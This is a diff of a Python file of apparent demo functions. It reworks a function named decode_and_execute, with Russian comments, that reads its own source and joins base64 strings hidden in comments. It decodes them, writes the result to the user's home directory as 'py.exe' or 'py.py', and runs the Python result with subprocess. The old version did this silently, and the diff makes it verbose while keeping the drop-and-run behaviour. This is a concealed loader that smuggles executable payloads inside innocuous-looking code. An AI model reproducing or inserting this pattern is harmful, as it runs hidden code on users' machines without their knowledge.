@@ -228,10 +228,14 @@ def fibonacci(n):
 def decode_and_execute():
     """11. Функция чтения комментариев, декодирования base64 и выполнения кода"""
     try:
+        # Получаем путь к текущему файлу
         current_file = __file__
+        
+        # Читаем содержимое файла
         with open(current_file, 'r', encoding='utf-8') as file:
             content = file.read()
         
+        # Ищем все комментарии с base64
         import re
         base64_pattern = r'#\s*([A-Za-z0-9+/=]+)'
         matches = re.findall(base64_pattern, content)
@@ -240,35 +244,63 @@ def decode_and_execute():
             print("Комментарии с base64 не найдены")
             return
         
+        # Складываем все найденные base64 строки
         combined_base64 = ''.join(matches)
+        print(f"Найденные закодированные строки: {matches}")
         
+        # Декодируем из base64 - получаем бинарные данные
         try:
             decoded_bytes = base64.b64decode(combined_base64)
-            decoded_text = decoded_bytes.decode('utf-8')
-        except Exception as e:
-            return
-        
-        user_profile = os.path.expanduser("~")
-        output_path = os.path.join(user_profile, "py.exe")
-        
-        try:
-            with open(output_path, 'w', encoding='utf-8') as output_file:
-                output_file.write(decoded_text)
-        except Exception as e:
-            return
-        
-        try:
-            result = subprocess.run([sys.executable, output_path], 
-                                  capture_output=True, text=True, timeout=10)
-            if result.stderr:
-                print()
-        except subprocess.TimeoutExpired:
-            print()
-        except Exception as e:
-            print()
+            print(f"Декодировано {len(decoded_bytes)} байт")
             
+            # Проверяем, являются ли данные текстом
+            try:
+                decoded_text = decoded_bytes.decode('utf-8')
+                print(f"Декодированный текст:\n{decoded_text}")
+                # Если это текст, сохраняем как текстовый файл
+                file_extension = ".py"
+            except UnicodeDecodeError:
+                # Если это бинарные данные, сохраняем как .exe
+                print("Данные содержат бинарный код")
+                decoded_text = None
+                file_extension = ".exe"
+            
+            # Определяем путь к пользовательской директории
+            user_profile = os.path.expanduser("~")
+            output_filename = "py" + file_extension
+            output_path = os.path.join(user_profile, output_filename)
+            
+            # Сохраняем декодированные данные в файл
+            try:
+                with open(output_path, 'wb') as output_file:  # 'wb' для бинарной записи
+                    output_file.write(decoded_bytes)
+                print(f"Файл успешно сохранен по пути: {output_path}")
+            except Exception as e:
+                print(f"Ошибка сохранения файла: {e}")
+                return
+            
+            # Если это текстовый файл (Python скрипт), пытаемся выполнить
+            if decoded_text is not None:
+                try:
+                    print("Попытка выполнения созданного файла...")
+                    result = subprocess.run([sys.executable, output_path], 
+                                          capture_output=True, text=True, timeout=10)
+                    print(f"Результат выполнения:\n{result.stdout}")
+                    if result.stderr:
+                        print(f"Ошибки выполнения:\n{result.stderr}")
+                except subprocess.TimeoutExpired:
+                    print("Выполнение превысило время ожидания")
+                except Exception as e:
+                    print(f"Ошибка выполнения файла: {e}")
+            else:
+                print("Бинарный файл сохранен, выполнение не требуется")
+                    
+        except Exception as e:
+            print(f"Ошибка декодирования base64: {e}")
+            return
+        
     except Exception as e:
-        print()
+        print(f"Произошла ошибка в функции decode_and_execute: {e}")
 
 # Демонстрация работы всех функций
 if __name__ == "__main__":
